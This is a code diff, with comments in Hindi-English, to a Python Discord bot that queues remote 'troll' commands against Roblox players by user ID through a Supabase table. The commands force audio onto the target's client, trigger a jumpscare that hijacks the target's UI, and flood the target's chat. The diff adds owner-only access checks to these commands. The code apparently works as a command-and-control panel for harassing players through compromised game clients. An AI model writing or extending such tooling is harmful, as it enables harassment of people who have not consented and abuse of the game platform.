@@ -17519,7 +17519,21 @@ def get_command():
     
     return jsonify({"type": "none"})
 
-# --- 1. AUDIO COMMAND (FIXED: Defer + Premium Embed) ---
+# --- OWNER/ADMIN CHECK FUNCTION (Updated for 'bot_admins' table) ---
+def check_owner(interaction: discord.Interaction) -> bool:
+    user_id = str(interaction.user.id)
+    try:
+        # Ab hum 'bot_admins' table check karenge
+        # Make sure tumhari table me column ka naam 'user_id' hi ho
+        response = supabase.table('bot_admins').select('user_id').eq('user_id', user_id).execute()
+        
+        # Agar list empty nahi hai, matlab wo Admin/Owner hai
+        return len(response.data) > 0
+    except Exception as e:
+        print(f"Admin Check Error: {e}")
+        return False
+
+# --- 1. AUDIO COMMAND (Owner Protected) ---
 
 class SoundSelect(discord.ui.Select):
     def __init__(self, target_id):
@@ -17528,13 +17542,15 @@ class SoundSelect(discord.ui.Select):
         super().__init__(placeholder="🎵 Select a Track to Inject...", max_values=1, min_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
-        # FIX: Sabse pehle Defer karo taaki timeout error na aaye
-        await interaction.response.defer()
+        # DROPDOWN CLICK PAR BHI CHECK (Extra Security)
+        if not check_owner(interaction):
+            await interaction.response.send_message("❌ **Access Denied:** You are not an owner.", ephemeral=True)
+            return
 
+        await interaction.response.defer()
         sound_name = self.values[0]
         sound_id = SOUND_MAP[sound_name]
         
-        # Database Entry
         data = {
             "target_id": self.target_id,
             "command_type": "audio",
@@ -17543,11 +17559,10 @@ class SoundSelect(discord.ui.Select):
         }
         supabase.table('troll_commands').insert(data).execute()
         
-        # Premium Embed Design (Gold Color)
         embed = create_premium_embed(
             title="🔊 Audio Injection Active",
             description=f"Audio stream has been forced onto target client.",
-            color=0xffd700, # Gold
+            color=0xffd700,
             fields=[
                 ("👤 Target ID", f"`{self.target_id}`"),
                 ("🎶 Track Name", f"**{sound_name}**"),
@@ -17556,8 +17571,6 @@ class SoundSelect(discord.ui.Select):
             ],
             thumbnail_url="https://cdn-icons-png.flaticon.com/512/3075/3075977.png"
         )
-        
-        # Original message edit karo taaki dropdown hat jaye
         await interaction.edit_original_response(content="", embed=embed, view=None)
 
 class SoundView(discord.ui.View):
@@ -17565,34 +17578,46 @@ class SoundView(discord.ui.View):
         super().__init__()
         self.add_item(SoundSelect(target_id))
 
-@bot.tree.command(name="audio", description="Play audio for player by ID")
+@bot.tree.command(name="audio", description="Play audio for player by ID (Owner Only)")
 @app_commands.describe(userid="Roblox User ID (Number)")
 async def audio(interaction: discord.Interaction, userid: str):
-    # Initial message
+    # --- OWNER CHECK ---
+    if not check_owner(interaction):
+        embed = discord.Embed(title="❌ NO PERMISSION", description="This command is for **Owners** only.", color=0xff0000)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    # -------------------
+
     embed = discord.Embed(description="👇 **Select a track from the database below:**", color=0x2b2d31)
     await interaction.response.send_message(embed=embed, view=SoundView(userid))
 
 
-# --- JUMPSCARE COMMAND FIX ---
-@bot.tree.command(name="scare", description="Jumpscare specific user by ID")
+# --- 2. JUMPSCARE COMMAND (Owner Protected) ---
+
+@bot.tree.command(name="scare", description="Jumpscare specific user by ID (Owner Only)")
 @app_commands.describe(userid="Roblox User ID (Number)")
 async def scare(interaction: discord.Interaction, userid: str):
+    # --- OWNER CHECK ---
+    if not check_owner(interaction):
+        embed = discord.Embed(title="❌ NO PERMISSION", description="This command is for **Owners** only.", color=0xff0000)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    # -------------------
+
     await interaction.response.defer()
     
     data = {
         "target_id": userid,
         "command_type": "jumpscare",
-        "payload": {"sound_id": "139918501762915"}, # <-- Working Scream ID
+        "payload": {"sound_id": "139918501762915"},
         "status": "pending"
     }
     supabase.table('troll_commands').insert(data).execute()
-    # ... baki code same ...
-   
-    # Premium Horror Embed (Red Color)
+    
     embed = create_premium_embed(
         title="👻 Jumpscare Triggered",
         description="Target client UI has been hijacked for jumpscare.",
-        color=0xff0000, # Red
+        color=0xff0000,
         fields=[
             ("👤 Target ID", f"`{userid}`"),
             ("🔊 Audio Source", "`Custom (Vikas ID)`"),
@@ -17600,15 +17625,21 @@ async def scare(interaction: discord.Interaction, userid: str):
         ],
         thumbnail_url="https://cdn-icons-png.flaticon.com/512/1998/1998610.png"
     )
-    
     await interaction.followup.send(embed=embed)
 
 
-# --- 3. SPAM COMMAND (Neon Green Embed) ---
+# --- 3. SPAM COMMAND (Owner Protected) ---
 
-@bot.tree.command(name="spam", description="Spam chat message with limit")
+@bot.tree.command(name="spam", description="Spam chat message with limit (Owner Only)")
 @app_commands.describe(userid="Roblox User ID", message="Message", amount="Count")
 async def spam(interaction: discord.Interaction, userid: str, message: str, amount: int):
+    # --- OWNER CHECK ---
+    if not check_owner(interaction):
+        embed = discord.Embed(title="❌ NO PERMISSION", description="This command is for **Owners** only.", color=0xff0000)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    # -------------------
+
     await interaction.response.defer()
     
     data = {
@@ -17619,11 +17650,10 @@ async def spam(interaction: discord.Interaction, userid: str, message: str, amou
     }
     supabase.table('troll_commands').insert(data).execute()
     
-    # Premium Hacker Embed (Neon Teal)
     embed = create_premium_embed(
         title="💬 Chat Flood Initiated",
         description="Injecting messages into target's chat stream.",
-        color=0x00ffcc, # Neon Teal
+        color=0x00ffcc,
         fields=[
             ("👤 Target ID", f"`{userid}`"),
             ("📨 Message", f"```\n{message}\n```"),
@@ -17631,8 +17661,8 @@ async def spam(interaction: discord.Interaction, userid: str, message: str, amou
         ],
         thumbnail_url="https://cdn-icons-png.flaticon.com/512/2919/2919600.png"
     )
-    
     await interaction.followup.send(embed=embed)
+
         
 # ========= DISABLE SPAM LOG =========
 import logging
